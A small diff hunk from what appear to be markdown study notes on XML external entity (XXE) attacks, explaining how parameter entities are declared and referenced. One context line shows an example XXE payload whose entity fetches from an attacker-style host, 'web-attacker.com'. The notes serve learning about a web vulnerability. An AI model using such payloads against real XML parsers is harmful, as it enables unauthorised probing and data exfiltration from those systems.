@@ -124,4 +124,3 @@ ex: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"
   -> `<!ENTITY % myparameterentity "my parameter entity value" >`
 - parameter entities are **referenced** using the *percent character instead of the usual ampersand*
   -> `%myparameterentity;`
-/gitcomm
